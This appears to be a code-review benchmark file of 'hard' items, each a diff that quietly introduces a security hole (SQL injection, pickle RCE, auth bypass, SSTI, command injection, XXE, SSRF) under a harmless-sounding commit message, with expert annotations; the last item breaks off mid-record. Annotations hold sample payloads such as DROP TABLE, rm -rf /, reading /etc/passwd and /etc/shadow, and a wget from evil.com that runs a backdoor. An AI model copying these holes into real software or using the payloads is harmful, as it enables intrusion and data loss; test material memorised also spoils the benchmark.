@@ -1,0 +1,353 @@
+[
+  {
+    "id": "hard_001",
+    "difficulty": "hard",
+    "diff_text": "--- a/api/search.py\n+++ b/api/search.py\n@@ -8,12 +8,10 @@\n from database import get_db_connection\n \n def search_users(request):\n     \"\"\"Search users by name or email.\"\"\"\n-    query = request.params.get('q', '')\n-    sanitized = query.replace(\"'\", \"''\").strip()\n+    query = request.params.get('q', '')\n     conn = get_db_connection()\n     cursor = conn.cursor()\n-    cursor.execute(\n-        \"SELECT id, name, email FROM users WHERE name LIKE ? OR email LIKE ?\",\n-        (f'%{sanitized}%', f'%{sanitized}%')\n-    )\n+    sql = f\"SELECT id, name, email FROM users WHERE name LIKE '%{query}%' OR email LIKE '%{query}%'\"\n+    cursor.execute(sql)\n     results = cursor.fetchall()\n     conn.close()\n     return {'users': [dict(r) for r in results]}",
+    "commit_message": "Simplify search query construction",
+    "pr_description": "Replaced parameterized query with f-string for readability. The sanitization was overly cautious.",
+    "file_path": "api/search.py",
+    "file_context": "from database import get_db_connection\n\ndef search_users(request):\n    \"\"\"Search users by name or email.\"\"\"\n    query = request.params.get('q', '')\n    conn = get_db_connection()\n    cursor = conn.cursor()\n    sql = f\"SELECT id, name, email FROM users WHERE name LIKE '%{query}%' OR email LIKE '%{query}%'\"\n    cursor.execute(sql)\n    results = cursor.fetchall()\n    conn.close()\n    return {'users': [dict(r) for r in results]}",
+    "language": "python",
+    "annotations": [
+      {
+        "line_number": 15,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "SQL Injection vulnerability. User input is directly interpolated into SQL via f-string. An attacker can input: ' OR 1=1 -- to dump all users, or ' UNION SELECT password FROM credentials -- to extract sensitive data.",
+        "explanation": "The original code used parameterized queries (cursor.execute with ? placeholders), which are immune to SQL injection. The f-string approach allows arbitrary SQL execution. Attack vector: q='; DROP TABLE users; -- would destroy the users table."
+      },
+      {
+        "line_number": 12,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "Removed input sanitization. Even the minimal quote-escaping (replace(\"'\", \"''\")) was removed, though it was insufficient anyway — parameterized queries were the real protection.",
+        "explanation": "While the original sanitization was defense-in-depth (parameterized queries were the primary defense), removing it without keeping parameterized queries leaves zero layers of protection."
+      }
+    ]
+  },
+  {
+    "id": "hard_002",
+    "difficulty": "hard",
+    "diff_text": "--- a/api/export.py\n+++ b/api/export.py\n@@ -3,16 +3,11 @@\n import pickle\n-import json\n import base64\n from flask import request, jsonify\n \n @app.route('/api/import-config', methods=['POST'])\n def import_config():\n     \"\"\"Import configuration from uploaded data.\"\"\"\n-    raw_data = request.json.get('config')\n-    if not raw_data:\n-        return jsonify({'error': 'No config data'}), 400\n-    try:\n-        config = json.loads(base64.b64decode(raw_data))\n-    except (json.JSONDecodeError, Exception):\n-        return jsonify({'error': 'Invalid config format'}), 400\n-    \n-    # Validate config schema\n-    if not _validate_config_schema(config):\n-        return jsonify({'error': 'Invalid config schema'}), 400\n+    raw_data = request.json.get('config', '')\n+    config = pickle.loads(base64.b64decode(raw_data))\n     \n     apply_config(config)\n     return jsonify({'status': 'Config imported successfully'})",
+    "commit_message": "Switch config import to use pickle for richer data types",
+    "pr_description": "JSON couldn't handle some complex config values (sets, tuples, custom objects). Switched to pickle which handles everything natively.",
+    "file_path": "api/export.py",
+    "file_context": "import pickle\nimport base64\nfrom flask import request, jsonify\n\n@app.route('/api/import-config', methods=['POST'])\ndef import_config():\n    \"\"\"Import configuration from uploaded data.\"\"\"\n    raw_data = request.json.get('config', '')\n    config = pickle.loads(base64.b64decode(raw_data))\n    \n    apply_config(config)\n    return jsonify({'status': 'Config imported successfully'})",
+    "language": "python",
+    "annotations": [
+      {
+        "line_number": 12,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "Insecure deserialization: pickle.loads on user-supplied input enables Remote Code Execution (RCE). An attacker can craft a pickle payload that executes arbitrary system commands when deserialized.",
+        "explanation": "pickle.loads executes arbitrary Python code during deserialization. An attacker sends a base64-encoded pickle payload like: __reduce__ returning os.system('rm -rf /') and the server executes it. This is OWASP A8 (Insecure Deserialization). The original JSON parsing was safe because JSON cannot execute code."
+      },
+      {
+        "line_number": 12,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "Removed config schema validation (_validate_config_schema). Even if pickle were safe, applying unvalidated config could change security settings, disable auth, or modify system behavior.",
+        "explanation": "The schema validation was a second layer of defense. Without it, even a well-typed but malicious config (e.g., {'admin': True, 'auth_disabled': True}) would be blindly applied."
+      },
+      {
+        "line_number": 12,
+        "severity": "major",
+        "issue_type": "bug",
+        "description": "Removed error handling for malformed input. If 'config' is empty or invalid base64, base64.b64decode or pickle.loads will raise an unhandled exception, returning a 500 error with a stack trace to the user.",
+        "explanation": "The original try/except provided a clean 400 error. Without it, malformed requests crash with unhandled exceptions that may leak internal server information in the traceback."
+      }
+    ]
+  },
+  {
+    "id": "hard_003",
+    "difficulty": "hard",
+    "diff_text": "--- a/auth/session.py\n+++ b/auth/session.py\n@@ -5,22 +5,16 @@\n from flask import request, redirect, session, make_response\n import secrets\n \n-def login_required(f):\n-    @wraps(f)\n-    def decorated(*args, **kwargs):\n-        if 'user_id' not in session:\n-            return redirect('/login')\n-        # Verify session hasn't been tampered with\n-        if not _verify_session_integrity(session):\n-            session.clear()\n-            return redirect('/login')\n-        return f(*args, **kwargs)\n-    return decorated\n+def login_required(f):\n+    @wraps(f)\n+    def decorated(*args, **kwargs):\n+        user_id = request.cookies.get('user_id')\n+        if not user_id:\n+            return redirect('/login')\n+        session['user_id'] = user_id\n+        return f(*args, **kwargs)\n+    return decorated\n \n @app.route('/dashboard')\n @login_required\n def dashboard():\n-    user = User.get(session['user_id'])\n+    user = User.get(session['user_id'])\n     return render_template('dashboard.html', user=user)",
+    "commit_message": "Fix session handling for stateless deployment",
+    "pr_description": "Updated session handling to work with our new stateless deployment. Session data is now read from cookies for compatibility with load balancers.",
+    "file_path": "auth/session.py",
+    "file_context": "from functools import wraps\nfrom flask import request, redirect, session, make_response\nimport secrets\n\ndef login_required(f):\n    @wraps(f)\n    def decorated(*args, **kwargs):\n        user_id = request.cookies.get('user_id')\n        if not user_id:\n            return redirect('/login')\n        session['user_id'] = user_id\n        return f(*args, **kwargs)\n    return decorated",
+    "language": "python",
+    "annotations": [
+      {
+        "line_number": 11,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "Authentication bypass via cookie manipulation. The user_id is now read directly from an unsigned client cookie instead of the server-side session. Any user can set cookie user_id=1 to impersonate the admin.",
+        "explanation": "Flask's session is cryptographically signed — users can't modify it without the secret key. A plain cookie (request.cookies.get('user_id')) has no integrity protection. An attacker simply sends Cookie: user_id=1 to become any user. This is a complete authentication bypass."
+      },
+      {
+        "line_number": 13,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "The user-supplied cookie value is directly written into the session (session['user_id'] = user_id). This means the attacker controls what user_id the server trusts for all subsequent operations.",
+        "explanation": "Setting session['user_id'] from an untrusted cookie means any downstream code checking session['user_id'] trusts the attacker-controlled value. This is not session management — it's session injection."
+      },
+      {
+        "line_number": 11,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "Removed session integrity verification (_verify_session_integrity). No CSRF or session fixation protection remains.",
+        "explanation": "The original code verified session integrity (likely checking for session fixation attacks or tampering). Without any verification, the session decorator provides zero security guarantees."
+      }
+    ]
+  },
+  {
+    "id": "hard_004",
+    "difficulty": "hard",
+    "diff_text": "--- a/api/user_profile.py\n+++ b/api/user_profile.py\n@@ -5,16 +5,12 @@\n from flask import request, jsonify, render_template_string\n from models import User\n \n @app.route('/api/profile/<int:user_id>')\n def get_profile(user_id):\n     user = User.get(user_id)\n     if not user:\n         return jsonify({'error': 'User not found'}), 404\n-    return jsonify({\n-        'name': user.name,\n-        'bio': user.bio,\n-        'joined': user.created_at.isoformat()\n-    })\n+    template = f\"<h1>{user.name}</h1><p>{user.bio}</p><small>Joined: {user.created_at}</small>\"\n+    return render_template_string(template)\n \n @app.route('/api/profile/<int:user_id>/update', methods=['POST'])\n def update_profile(user_id):\n-    data = request.json\n-    allowed_fields = {'name', 'bio', 'avatar_url'}\n-    updates = {k: v for k, v in data.items() if k in allowed_fields}\n-    User.update(user_id, **updates)\n+    User.update(user_id, **request.json)\n     return jsonify({'status': 'updated'})",
+    "commit_message": "Render profile as HTML for new frontend",
+    "pr_description": "Changed profile endpoint to return HTML for server-side rendering. Also simplified the update endpoint.",
+    "file_path": "api/user_profile.py",
+    "file_context": "from flask import request, jsonify, render_template_string\nfrom models import User\n\n@app.route('/api/profile/<int:user_id>')\ndef get_profile(user_id):\n    user = User.get(user_id)\n    if not user:\n        return jsonify({'error': 'User not found'}), 404\n    template = f\"<h1>{user.name}</h1><p>{user.bio}</p><small>Joined: {user.created_at}</small>\"\n    return render_template_string(template)\n\n@app.route('/api/profile/<int:user_id>/update', methods=['POST'])\ndef update_profile(user_id):\n    User.update(user_id, **request.json)\n    return jsonify({'status': 'updated'})",
+    "language": "python",
+    "annotations": [
+      {
+        "line_number": 12,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "Stored XSS via Server-Side Template Injection (SSTI). User-controlled data (user.name, user.bio) is inserted into an f-string and then passed to render_template_string. If user.bio contains {{ config }}, Jinja2 will execute it, leaking server config including SECRET_KEY.",
+        "explanation": "render_template_string interprets Jinja2 syntax. If a user sets their bio to '{{ config.SECRET_KEY }}', this value gets interpolated into the template string and Jinja2 evaluates it, returning the server's secret key. Worse, '{{ ''.__class__.__mro__[2].__subclasses__() }}' enables RCE via Jinja2 sandbox escape."
+      },
+      {
+        "line_number": 17,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "Mass assignment vulnerability. Removed field allowlist — User.update now accepts ALL fields from request body. An attacker can set is_admin=true, role='superuser', or any other user field.",
+        "explanation": "The original code filtered updates to only 'name', 'bio', 'avatar_url'. Now **request.json passes everything directly to User.update. Request body: {'is_admin': true, 'role': 'superuser'} would escalate privileges."
+      }
+    ]
+  },
+  {
+    "id": "hard_005",
+    "difficulty": "hard",
+    "diff_text": "--- a/middleware/cors.py\n+++ b/middleware/cors.py\n@@ -3,18 +3,10 @@\n from flask import Flask, request, make_response\n \n-ALLOWED_ORIGINS = [\n-    'https://app.company.com',\n-    'https://staging.company.com',\n-]\n-\n def add_cors_headers(response):\n-    origin = request.headers.get('Origin')\n-    if origin in ALLOWED_ORIGINS:\n-        response.headers['Access-Control-Allow-Origin'] = origin\n-    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'\n-    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'\n-    response.headers['Access-Control-Max-Age'] = '3600'\n+    response.headers['Access-Control-Allow-Origin'] = '*'\n+    response.headers['Access-Control-Allow-Methods'] = '*'\n+    response.headers['Access-Control-Allow-Headers'] = '*'\n+    response.headers['Access-Control-Allow-Credentials'] = 'true'\n     return response\n \n app.after_request(add_cors_headers)",
+    "commit_message": "Fix CORS for development",
+    "pr_description": "Relaxed CORS settings to fix issues during development with the new frontend running on a different port.",
+    "file_path": "middleware/cors.py",
+    "file_context": "from flask import Flask, request, make_response\n\ndef add_cors_headers(response):\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    response.headers['Access-Control-Allow-Methods'] = '*'\n    response.headers['Access-Control-Allow-Headers'] = '*'\n    response.headers['Access-Control-Allow-Credentials'] = 'true'\n    return response\n\napp.after_request(add_cors_headers)",
+    "language": "python",
+    "annotations": [
+      {
+        "line_number": 7,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "CORS misconfiguration: Allow-Origin: * combined with Allow-Credentials: true. This allows any website to make authenticated cross-origin requests to your API, stealing user data and performing actions on their behalf.",
+        "explanation": "With Allow-Origin: * and Allow-Credentials: true, a malicious site evil.com can make fetch requests to your API with the victim's cookies. This is a CSRF bypass and data theft vulnerability. Browsers should reject this combination per spec, but older browsers may not."
+      },
+      {
+        "line_number": 6,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "Removed origin allowlist. Any origin can now interact with the API. Combined with credentials: true, this means any website can act as the user.",
+        "explanation": "The original ALLOWED_ORIGINS restricted cross-origin access to company domains only. Removing the allowlist means third-party sites can make authenticated requests to administrative endpoints."
+      },
+      {
+        "line_number": 8,
+        "severity": "minor",
+        "issue_type": "security",
+        "description": "Allow-Methods changed from explicit list to wildcard. This exposes all HTTP methods including PATCH, DELETE, and OPTIONS which may not all be intended for cross-origin use.",
+        "explanation": "The original code explicitly listed allowed methods. Wildcard exposes all methods, which may include dangerous operations like DELETE that shouldn't be accessible cross-origin."
+      }
+    ]
+  },
+  {
+    "id": "hard_006",
+    "difficulty": "hard",
+    "diff_text": "--- a/api/password_reset.py\n+++ b/api/password_reset.py\n@@ -5,22 +5,14 @@\n import hashlib\n-import secrets\n import time\n from models import User, PasswordResetToken\n \n def request_password_reset(email: str) -> str:\n     user = User.find_by_email(email)\n     if not user:\n-        # Don't reveal if email exists\n-        return \"If an account exists, a reset link has been sent.\"\n-    \n-    token = secrets.token_urlsafe(32)\n-    hashed_token = hashlib.sha256(token.encode()).hexdigest()\n-    PasswordResetToken.create(\n-        user_id=user.id,\n-        token_hash=hashed_token,\n-        expires_at=time.time() + 3600\n-    )\n-    send_email(email, f\"Reset link: https://app.com/reset?token={token}\")\n-    return \"If an account exists, a reset link has been sent.\"\n+        return \"No account found with that email.\"\n+    \n+    token = hashlib.md5(f\"{user.id}:{user.email}\".encode()).hexdigest()\n+    PasswordResetToken.create(user_id=user.id, token_hash=token)\n+    send_email(email, f\"Reset link: https://app.com/reset?token={token}\")\n+    return f\"Reset link sent to {email}\"\n \n def reset_password(token: str, new_password: str) -> bool:\n-    hashed = hashlib.sha256(token.encode()).hexdigest()\n-    reset = PasswordResetToken.find_by_hash(hashed)\n-    if not reset or reset.expires_at < time.time():\n+    reset = PasswordResetToken.find_by_hash(token)\n+    if not reset:\n         return False\n     user = User.get(reset.user_id)\n-    user.set_password(new_password)\n-    reset.delete()  # One-time use\n+    user.password = new_password\n     return True",
+    "commit_message": "Simplify password reset flow",
+    "pr_description": "Simplified the password reset mechanism. Removed unnecessary complexity around token generation.",
+    "file_path": "api/password_reset.py",
+    "file_context": "import hashlib\nimport time\nfrom models import User, PasswordResetToken\n\ndef request_password_reset(email: str) -> str:\n    user = User.find_by_email(email)\n    if not user:\n        return \"No account found with that email.\"\n    \n    token = hashlib.md5(f\"{user.id}:{user.email}\".encode()).hexdigest()\n    PasswordResetToken.create(user_id=user.id, token_hash=token)\n    send_email(email, f\"Reset link: https://app.com/reset?token={token}\")\n    return f\"Reset link sent to {email}\"\n\ndef reset_password(token: str, new_password: str) -> bool:\n    reset = PasswordResetToken.find_by_hash(token)\n    if not reset:\n        return False\n    user = User.get(reset.user_id)\n    user.password = new_password\n    return True",
+    "language": "python",
+    "annotations": [
+      {
+        "line_number": 11,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "User enumeration: Different error messages for existing vs non-existing emails. 'No account found' reveals which emails are registered, enabling targeted attacks.",
+        "explanation": "The original code returned the same message regardless — hiding email existence. Now attackers can enumerate valid emails by checking the response message."
+      },
+      {
+        "line_number": 13,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "Predictable reset token: MD5(user_id:email) is static and deterministic. An attacker who knows a user's email (and can guess their user_id) can compute the reset token without receiving the email.",
+        "explanation": "secrets.token_urlsafe(32) generated a cryptographically random 256-bit token. MD5(user_id:email) is computable by anyone who knows the user's email and can guess sequential user IDs. The same token is generated every time — reuse across reset requests."
+      },
+      {
+        "line_number": 14,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "Token stored as plaintext (no hashing). Original code hashed the token with SHA-256 before storage. Now if the database is leaked, all reset tokens are immediately usable.",
+        "explanation": "The original design: user gets token, DB stores hash(token). If DB is leaked, attacker has hashes but not tokens. New design: DB stores the actual token. Database breach = immediate account takeover for all pending resets."
+      },
+      {
+        "line_number": 14,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "No token expiration. Removed expires_at from token creation and expiry check from reset_password. Tokens are valid forever once created.",
+        "explanation": "The original 1-hour expiry limited the attack window. Now a leaked or intercepted reset token works indefinitely — even months later."
+      },
+      {
+        "line_number": 23,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "Password stored as plaintext: user.password = new_password instead of user.set_password(new_password). set_password likely hashed the password; direct assignment stores it in cleartext.",
+        "explanation": "user.set_password() presumably uses bcrypt/argon2 to hash the password. user.password = new_password stores the raw string. If the database is compromised, all reset passwords are immediately readable."
+      },
+      {
+        "line_number": 24,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "Removed reset.delete() — tokens are not invalidated after use. The same reset token can be used repeatedly to change the password, even after the user has already reset it.",
+        "explanation": "One-time-use tokens are a security best practice. Without deletion, an attacker who obtains a reset token can use it indefinitely to re-reset the password even after the legitimate user changes it."
+      }
+    ]
+  },
+  {
+    "id": "hard_007",
+    "difficulty": "hard",
+    "diff_text": "--- a/api/files.py\n+++ b/api/files.py\n@@ -3,18 +3,12 @@\n import os\n-import subprocess\n from flask import request, send_file, jsonify\n \n @app.route('/api/files/<path:filepath>')\n def serve_file(filepath):\n     \"\"\"Serve a file from the documents directory.\"\"\"\n-    base_dir = os.path.abspath('/app/documents')\n-    requested = os.path.abspath(os.path.join(base_dir, filepath))\n-    \n-    if not requested.startswith(base_dir):\n-        return jsonify({'error': 'Access denied'}), 403\n-    \n-    if not os.path.isfile(requested):\n+    full_path = f'/app/documents/{filepath}'\n+    if not os.path.exists(full_path):\n         return jsonify({'error': 'File not found'}), 404\n-    \n-    return send_file(requested)\n+    return send_file(full_path)\n \n @app.route('/api/files/convert', methods=['POST'])\n def convert_file():\n-    filename = request.json.get('filename', '')\n-    format_to = request.json.get('format', 'pdf')\n-    if format_to not in ('pdf', 'docx', 'txt'):\n-        return jsonify({'error': 'Unsupported format'}), 400\n-    safe_filename = os.path.basename(filename)\n-    result = subprocess.run(\n-        ['libreoffice', '--convert-to', format_to, f'/app/documents/{safe_filename}'],\n-        capture_output=True, timeout=30\n-    )\n+    filename = request.json.get('filename', '')\n+    format_to = request.json.get('format', 'pdf')\n+    os.system(f'libreoffice --convert-to {format_to} /app/documents/{filename}')\n     return jsonify({'status': 'converted'})",
+    "commit_message": "Simplify file serving and conversion",
+    "pr_description": "Simplified the file API. Removed overly defensive path checking and subprocess complexity.",
+    "file_path": "api/files.py",
+    "file_context": "import os\nfrom flask import request, send_file, jsonify\n\n@app.route('/api/files/<path:filepath>')\ndef serve_file(filepath):\n    full_path = f'/app/documents/{filepath}'\n    if not os.path.exists(full_path):\n        return jsonify({'error': 'File not found'}), 404\n    return send_file(full_path)\n\n@app.route('/api/files/convert', methods=['POST'])\ndef convert_file():\n    filename = request.json.get('filename', '')\n    format_to = request.json.get('format', 'pdf')\n    os.system(f'libreoffice --convert-to {format_to} /app/documents/{filename}')\n    return jsonify({'status': 'converted'})",
+    "language": "python",
+    "annotations": [
+      {
+        "line_number": 8,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "Path traversal vulnerability. Removed directory traversal protection (os.path.abspath + startswith check). filepath='../../etc/passwd' will serve /etc/passwd.",
+        "explanation": "The original code resolved the absolute path and verified it was within /app/documents. The f-string approach allows ../../../etc/passwd to escape the documents directory and read any file on the system."
+      },
+      {
+        "line_number": 17,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "OS Command Injection via os.system. Both 'filename' and 'format_to' are user-controlled and directly interpolated into a shell command. Attacker can execute arbitrary commands.",
+        "explanation": "os.system runs a shell command. filename='; rm -rf / #' or format_to='pdf; cat /etc/shadow #' executes arbitrary commands. The original code used subprocess.run with a list (no shell) and os.path.basename for filename sanitization."
+      },
+      {
+        "line_number": 17,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "Removed format validation allowlist. Original limited formats to ('pdf', 'docx', 'txt'). Now any string is passed to libreoffice, and since os.system is used, any string can contain shell metacharacters.",
+        "explanation": "Without allowlist, format_to could be 'pdf; wget evil.com/backdoor -O /tmp/b && chmod +x /tmp/b && /tmp/b' — downloading and executing a backdoor."
+      },
+      {
+        "line_number": 17,
+        "severity": "minor",
+        "issue_type": "bug",
+        "description": "Removed timeout from the conversion command. Original had timeout=30 on subprocess.run. os.system has no timeout, so a hang from libreoffice will block the web worker indefinitely.",
+        "explanation": "Large file conversions can take minutes or hang. Without timeout, a single slow conversion blocks a web worker forever, eventually exhausting the worker pool."
+      }
+    ]
+  },
+  {
+    "id": "hard_008",
+    "difficulty": "hard",
+    "diff_text": "--- a/api/admin.py\n+++ b/api/admin.py\n@@ -8,20 +8,12 @@\n from flask import request, jsonify\n from functools import wraps\n \n-def admin_required(f):\n-    @wraps(f)\n-    def decorated(*args, **kwargs):\n-        auth_header = request.headers.get('Authorization', '')\n-        if not auth_header.startswith('Bearer '):\n-            return jsonify({'error': 'Missing token'}), 401\n-        token = auth_header[7:]\n-        user = verify_token(token)\n-        if not user or user.role != 'admin':\n-            return jsonify({'error': 'Forbidden'}), 403\n-        return f(*args, **kwargs)\n-    return decorated\n-\n-@app.route('/api/admin/users', methods=['DELETE'])\n-@admin_required\n+@app.route('/api/admin/users', methods=['DELETE'])\n def delete_all_users():\n-    count = User.delete_where(role='user')  # Never delete admins\n+    role_filter = request.args.get('role', 'user')\n+    count = User.delete_where(role=role_filter)\n     return jsonify({'deleted': count})\n \n-@app.route('/api/admin/config', methods=['PUT'])\n-@admin_required\n+@app.route('/api/admin/config', methods=['PUT'])\n def update_system_config():\n-    allowed_keys = {'maintenance_mode', 'max_upload_size', 'rate_limit'}\n-    updates = {k: v for k, v in request.json.items() if k in allowed_keys}\n-    SystemConfig.update(**updates)\n+    SystemConfig.update(**request.json)\n     return jsonify({'status': 'updated'})",
+    "commit_message": "Refactor admin endpoints for new auth middleware",
+    "pr_description": "Removed per-route auth decorators. The new API gateway handles authentication. Also made the delete endpoint more flexible.",
+    "file_path": "api/admin.py",
+    "file_context": "from flask import request, jsonify\nfrom functools import wraps\n\n@app.route('/api/admin/users', methods=['DELETE'])\ndef delete_all_users():\n    role_filter = request.args.get('role', 'user')\n    count = User.delete_where(role=role_filter)\n    return jsonify({'deleted': count})\n\n@app.route('/api/admin/config', methods=['PUT'])\ndef update_system_config():\n    SystemConfig.update(**request.json)\n    return jsonify({'status': 'updated'})",
+    "language": "python",
+    "annotations": [
+      {
+        "line_number": 7,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "Removed admin authentication entirely. admin_required decorator is deleted and not applied to any route. DELETE /api/admin/users is now accessible to any unauthenticated user.",
+        "explanation": "The admin_required decorator verified Bearer token + admin role. Without it, anyone can call DELETE /api/admin/users or PUT /api/admin/config. If the 'API gateway handles auth' claim is false (no evidence of gateway config), these are wide-open destructive endpoints."
+      },
+      {
+        "line_number": 9,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "User-controlled role filter in deletion. Original hardcoded role='user' (protecting admins). Now role=request.args.get('role', 'user') means ?role=admin deletes all admin accounts.",
+        "explanation": "The original code specifically protected admin accounts by hardcoding role='user'. The parameterized version lets an attacker delete admins: DELETE /api/admin/users?role=admin wipes all admin accounts."
+      },
+      {
+        "line_number": 14,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "Mass assignment in system config update. Removed allowed_keys allowlist. Any JSON key is now passed to SystemConfig.update, potentially allowing modification of critical security settings.",
+        "explanation": "The allowlist restricted updates to safe keys (maintenance_mode, max_upload_size, rate_limit). Without it, an attacker could set {'secret_key': 'known_value', 'debug': true, 'auth_enabled': false}."
+      }
+    ]
+  },
+  {
+    "id": "hard_009",
+    "difficulty": "hard",
+    "diff_text": "--- a/utils/xml_parser.py\n+++ b/utils/xml_parser.py\n@@ -3,18 +3,10 @@\n-from defusedxml import ElementTree as ET\n+import xml.etree.ElementTree as ET\n from io import BytesIO\n \n def parse_user_xml(xml_string: str) -> dict:\n     \"\"\"Parse user-uploaded XML configuration.\"\"\"\n-    if len(xml_string) > 1_000_000:  # 1MB limit\n-        raise ValueError(\"XML too large\")\n-    \n     try:\n-        root = ET.fromstring(xml_string)\n+        root = ET.fromstring(xml_string)\n     except ET.ParseError:\n         raise ValueError(\"Invalid XML\")\n     \n-    # Only extract expected fields\n-    result = {}\n-    for field in ('name', 'email', 'role'):\n-        elem = root.find(field)\n-        if elem is not None:\n-            result[field] = elem.text\n-    return result\n+    return {elem.tag: elem.text for elem in root}",
+    "commit_message": "Simplify XML parsing",
+    "pr_description": "Replaced defusedxml with stdlib xml parser. Simplified the field extraction logic.",
+    "file_path": "utils/xml_parser.py",
+    "file_context": "import xml.etree.ElementTree as ET\nfrom io import BytesIO\n\ndef parse_user_xml(xml_string: str) -> dict:\n    \"\"\"Parse user-uploaded XML configuration.\"\"\"\n    try:\n        root = ET.fromstring(xml_string)\n    except ET.ParseError:\n        raise ValueError(\"Invalid XML\")\n    \n    return {elem.tag: elem.text for elem in root}",
+    "language": "python",
+    "annotations": [
+      {
+        "line_number": 4,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "XXE (XML External Entity) vulnerability. Replaced defusedxml with stdlib xml.etree.ElementTree, which is vulnerable to XXE attacks. An attacker can read local files or perform SSRF.",
+        "explanation": "defusedxml blocks XML entity expansion and external entity references. stdlib ET allows: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> which reads /etc/passwd. Also vulnerable to billion laughs (XML bomb) denial of service."
+      },
+      {
+        "line_number": 4,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "Removed XML size limit (1MB). Without size limit, an attacker can send a multi-GB XML payload or a billion-laughs XML bomb that expands to consume all available memory.",
+        "explanation": "XML bombs like <!ENTITY a '&b;&b;&b;&b;&b;&b;&b;&b;'> can expand exponentially, consuming gigabytes of memory from a few KB of input. The 1MB limit was a DoS mitigation."
+      },
+      {
+        "line_number": 13,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "Removed field allowlist. Original extracted only (name, email, role). Now extracts ALL elements from XML, potentially exposing internal fields or injecting unexpected data.",
+        "explanation": "The field allowlist prevented injection of unexpected fields. An attacker can now add <is_admin>true</is_admin> or <role>superuser</role> and it will be included in the result dict."
+      }
+    ]
+  },
+  {
+    "id": "hard_010",
+    "difficulty": "hard",
+    "diff_text": "--- a/services/webhook.py\n+++ b/services/webhook.py\n@@ -3,24 +3,14 @@\n import hmac\n import hashlib\n-import json\n from flask import request, jsonify\n-from urllib.parse import urlparse\n \n-ALLOWED_WEBHOOK_DOMAINS = ['hooks.slack.com', 'api.github.com', 'hooks.zapier.com']\n \n @app.route('/api/webhooks/register', methods=['POST'])\n def register_webhook():\n-    url = request.json.get('url')\n-    secret = request.json.get('secret')\n-    \n-    # Validate URL\n-    parsed = urlparse(url)\n-    if parsed.scheme != 'https':\n-        return jsonify({'error': 'HTTPS required'}), 400\n-    if parsed.hostname not in ALLOWED_WEBHOOK_DOMAINS:\n-        return jsonify({'error': 'Domain not allowed'}), 400\n-    \n-    webhook = Webhook.create(url=url, secret_hash=hashlib.sha256(secret.encode()).hexdigest())\n+    url = request.json.get('url', '')\n+    webhook = Webhook.create(url=url)\n     return jsonify({'id': webhook.id})\n \n @app.route('/api/webhooks/<int:webhook_id>/trigger', methods=['POST'])\n def trigger_webhook(webhook_id):\n     webhook = Webhook.get(webhook_id)\n-    payload = json.dumps(request.json)\n-    signature = hmac.new(\n-        webhook.secret_hash.encode(), payload.encode(), hashlib.sha256\n-    ).hexdigest()\n-    response = requests.post(\n-        webhook.url,\n-        data=payload,\n-        headers={\n-            'Content-Type': 'application/json',\n-            'X-Webhook-Signature': signature\n-        },\n-        timeout=10\n-    )\n+    response = requests.post(webhook.url, json=request.json)\n     return jsonify({'status': response.status_code})",
+    "commit_message": "Simplify webhook system",
+    "pr_description": "Simplified webhook registration and delivery. Removed unnecessary URL validation and signature logic.",
+    "file_path": "services/webhook.py",
+    "file_context": "import hmac\nimport hashlib\nfrom flask import request, jsonify\n\n@app.route('/api/webhooks/register', methods=['POST'])\ndef register_webhook():\n    url = request.json.get('url', '')\n    webhook = Webhook.create(url=url)\n    return jsonify({'id': webhook.id})\n\n@app.route('/api/webhooks/<int:webhook_id>/trigger', methods=['POST'])\ndef trigger_webhook(webhook_id):\n    webhook = Webhook.get(webhook_id)\n    response = requests.post(webhook.url, json=request.json)\n    return jsonify({'status': response.status_code})",
+    "language": "python",
+    "annotations": [
+      {
+        "line_number": 9,
+        "severity": "critical",
+        "issue_type": "security",
+        "description": "SSRF (Server-Side Request Forgery) vulnerability. Removed URL domain validation. An attacker can register a webhook with url='http://169.254.169.254/latest/meta-data/' (AWS metadata endpoint) or 'http://localhost:6379/' (internal Redis) to access internal services.",
+        "explanation": "The ALLOWED_WEBHOOK_DOMAINS check prevented SSRF by restricting webhook URLs to known-safe domains. Without it, the server will make requests to any URL the attacker specifies, including internal network services, cloud metadata APIs, and localhost services."
+      },
+      {
+        "line_number": 9,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "Removed HTTPS requirement. Webhooks can now be registered with HTTP URLs, sending potentially sensitive payload data over unencrypted connections.",
+        "explanation": "The original https:// check ensured webhook payloads were encrypted in transit. HTTP webhooks can be intercepted by network attackers."
+      },
+      {
+        "line_number": 16,
+        "severity": "major",
+        "issue_type": "security",
+        "description": "Removed webhook signature verification. Without HMAC signing, the receiving endpoint cannot verify that the webhook came from your server — any attacker can forge webhook deliveries.",
+        "explanation": "The X-Webhook-Signature header allowed the receiving endpoint to verify authenticity. Without it, webhook endpoints have no way to distinguish legitimate deliveries from spoofed requests."
+      },
+      {
+        "line_number": 16,
+        "severity": "minor",
+        "issue_type": "bug",
+        "description": "Removed timeout=10 from requests.post. If the webhook endpoint is slow or unreachable, the request will hang indefinitely, blocking the web worker.",
